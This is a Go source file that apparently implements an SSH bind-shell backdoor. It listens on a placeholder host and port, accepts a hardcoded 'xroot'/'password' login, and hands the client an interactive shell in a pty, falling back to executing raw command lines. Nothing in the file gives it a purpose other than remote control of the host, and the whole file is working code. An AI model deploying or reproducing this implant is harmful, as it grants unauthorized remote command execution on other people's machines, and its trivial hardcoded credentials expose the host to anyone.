package main

import (
	"io"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"golang.org/x/term"
)

const (
	PASSWORD = "password"
	USERNAME = "xroot"
)

func simpleCommandShellHandler(s ssh.Session) {
	term := term.NewTerminal(s, ">")
	for {
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		in := strings.Split(line, " ")
		if in[0] == "" {
			continue
		}
		if in[0] == "exit" {
			break
		}
		exe := exec.Command(in[0], in[1:]...)
		out, err := exe.Output()
		if err != nil {
			term.Write([]byte(err.Error() + "\n"))
		}
		term.Write(out)
	}
}

func requestUserInput(term *term.Terminal, requestText string, defaultVal string) (val string) {
	_val := defaultVal
	for {
		term.Write([]byte(requestText))
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		if line == "" {
			break
		} else {
			_val = line
			break
		}
	}
	return _val
}

func confirmShellConfig(s ssh.Session) (size pty.Winsize, shell string) {
	term := term.NewTerminal(s, ">")
	cols, _ := strconv.ParseUint(requestUserInput(term, "Please input winsize Cols [150]: \n", "150"), 10, 10)
	rows, _ := strconv.ParseInt(requestUserInput(term, "Please input winsize Rows [70]: \n", "100"), 10, 10)
	shellPath := requestUserInput(term, "Please input shell path [/bin/sh]: \n", "/bin/sh")
	winsize := pty.Winsize{
		Cols: uint16(cols),
		Rows: uint16(rows),
	}
	return winsize, shellPath
}

func main() {
	ssh.ListenAndServe("HOST:PORT", func(s ssh.Session) {
		if runtime.GOOS == "windows" {
			io.WriteString(s, "\n[-] Windows dont have tty, using simple command shell.\n")
			simpleCommandShellHandler(s)
		} else {
			winsize, shell := confirmShellConfig(s)
			c := exec.Command(shell)
			_pty, _err := pty.StartWithSize(c, &winsize)
			if _err != nil {
				io.WriteString(s, "\n[-] Spawn pty failed, using simple command shell.\n")
				simpleCommandShellHandler(s)
			} else {

				defer func() { _ = _pty.Close() }()
				go func() {
					for {
						buffer := make([]byte, 1024)
						length, _ := s.Read(buffer)
						if length > 0 {
							_pty.Write(buffer[:length])
						} else {
							_pty.Close()
							c.Process.Kill()
							break
						}
					}
				}()
				for {
					buffer := make([]byte, 1024)
					length, _ := _pty.Read(buffer)
					if length > 0 {
						s.Write(buffer[:length])
					} else {
						_pty.Close()
						c.Process.Kill()
						break
					}
				}
			}
		}
	},
		ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {
			return pass == PASSWORD && ctx.User() == USERNAME
		}),
	)
}
